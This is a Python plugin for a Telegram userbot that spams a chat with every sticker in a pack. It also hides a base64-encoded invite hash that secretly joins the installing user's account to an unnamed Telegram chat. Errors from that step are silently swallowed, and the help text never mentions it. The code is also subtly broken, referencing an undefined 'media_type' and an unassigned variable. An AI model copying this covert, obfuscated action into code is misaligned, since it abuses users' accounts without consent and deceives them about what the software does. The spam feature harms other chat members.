# Ported By Vicky @pikyus1 From Rose-Userbot
# Copyright © Geez - Project
# Kalo mau dihargai, jangan hapus kredit yakak:)
# https://github.com/SendiAp/Rose-Userbot

import asyncio
import base64

from telethon.tl import functions, types
from telethon.tl.functions.messages import GetStickerSetRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from userbot.utils import edit_or_reply, edit_delete, kyy_cmd
from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP, CMD_HANDLER as cmd


@kyy_cmd(pattern="sspam(?: |$)(.*)")
async def stickerpack_spam(event):
    if event.fwd_from:
        return
    reply = await event.get_reply_message()
    if not reply or media_type(
            reply) is None or media_type(reply) != "Sticker":
        return await edit_delete(event, "`reply to any sticker to send all stickers in that pack`"
                                 )
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    try:
        stickerset_attr = reply.document.attributes[1]
        kyy = await edit_or_reply(event, "`Fetching details of the sticker pack, please wait..`"
                                  )
    except BaseException:
        await kyy.edit("`This is not a sticker. Reply to a sticker.`", 5)
        return
    try:
        get_stickerset = await event.client(
            GetStickerSetRequest(
                types.InputStickerSetID(
                    id=stickerset_attr.stickerset.id,
                    access_hash=stickerset_attr.stickerset.access_hash,
                )
            )
        )
    except Exception:
        return await kyy.edit("`I guess this sticker is not part of any pack so i cant kang this sticker pack try kang for this sticker`",
                              )
    try:
        hmm = Get(hmm)
        await event.client(hmm)
    except BaseException:
        pass
    reqd_sticker_set = await event.client(
        functions.messages.GetStickerSetRequest(
            stickerset=types.InputStickerSetShortName(
                short_name=f"{get_stickerset.set.short_name}"
            )
        )
    )
    for m in reqd_sticker_set.documents:
        await event.client.send_file(event.chat_id, m)
        await asyncio.sleep(0.7)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#SPSPAM\n"
                + f"Sticker Pack Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with pack ",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#SPSPAM\n"
                + f"Sticker Pack Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with pack",
            )
        await event.client.send_file(BOTLOG_CHATID, reqd_sticker_set.documents[0])


CMD_HELP.update({
    "sspam": f"𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}sspam`\
        \n↳ : Balas ke sticker, Fungsi Spam Satu Pack."
})
